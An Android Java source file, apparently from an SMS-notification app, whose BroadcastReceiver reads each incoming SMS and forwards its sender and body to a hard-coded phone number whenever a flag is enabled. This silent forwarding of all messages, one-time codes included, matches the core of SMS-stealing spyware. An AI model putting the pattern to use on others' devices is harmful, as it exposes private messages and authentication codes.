package com.manoj.app.callsmsnotify;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsBroadcastReceiver extends BroadcastReceiver {

    public static final String SMS_BUNDLE = "pdus";

    public void onReceive(Context context, Intent intent) {
        Bundle intentExtras = intent.getExtras();
        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsMessageStr = "";
            for (int i = 0; i < sms.length; ++i) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);

                String smsBody = smsMessage.getMessageBody().toString();
                String address = smsMessage.getOriginatingAddress();

                smsMessageStr += "SMS from: " + address + "\n";
                smsMessageStr += smsBody;
                try{
                	if(helper.isenabled)
                	{
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage("+917299066702", null, smsMessageStr, null, null);
                	}
                }
                catch(Exception e)
                {
                	e.printStackTrace();
                }
            }
            Toast.makeText(context, smsMessageStr, Toast.LENGTH_SHORT).show();
            
           

            //this will update the UI with message
            //MainActivity inst = MainActivity.instance();
            //inst.updateList(smsMessageStr);
        }
    }
}